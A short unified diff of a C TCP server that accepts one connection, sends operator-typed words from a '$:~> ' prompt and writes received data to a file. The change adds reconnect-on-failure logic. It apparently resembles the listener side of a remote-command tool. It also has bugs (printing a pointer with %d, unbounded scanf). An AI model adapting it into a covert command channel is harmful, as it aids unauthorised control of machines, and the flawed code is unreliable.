@@ -31,7 +31,7 @@ void* listen(void* socket) {
 	buffer[len-1] = '\0';
     // Write data to the file
         fprintf(file, "%s", buffer);  // You can use fprintf, fputs, or fwrite
-        printf("[+] Data written to file successfully.\n");
+        printf("\n[+] Data written to file successfully.\n");
 
     // Close the file
         fclose(file);
@@ -46,7 +46,7 @@ int main()
     struct sockaddr_in address;
     int opt = 1;
     int addrlen = sizeof(address);
-
+loop_back:
     // Step 1: Create the socket
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd == 0) {
@@ -81,7 +81,6 @@ int main()
         exit(EXIT_FAILURE);
     }
     printf("[+] Listening for incoming connections...\n");
-
     // Step 5: Accept an incoming connection
     int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
     if (new_socket < 0) {
@@ -99,7 +98,14 @@ int main()
 	char code_word[4096] = {0};
 	printf("$:~> ");
 	scanf("%s", code_word);
-	send(new_socket, code_word, strlen(code_word), 0);
+	int check = send(new_socket, code_word, strlen(code_word), 0);
+	if((check <= 0)) {
+	    close(new_socket);
+	    printf("\n[+] connection aborted\n");
+	    pthread_cancel(thread);
+	    goto loop_back;
+	}
+	printf("%d", &check);
     }
     // Step 7: Close sockets
     close(new_socket);
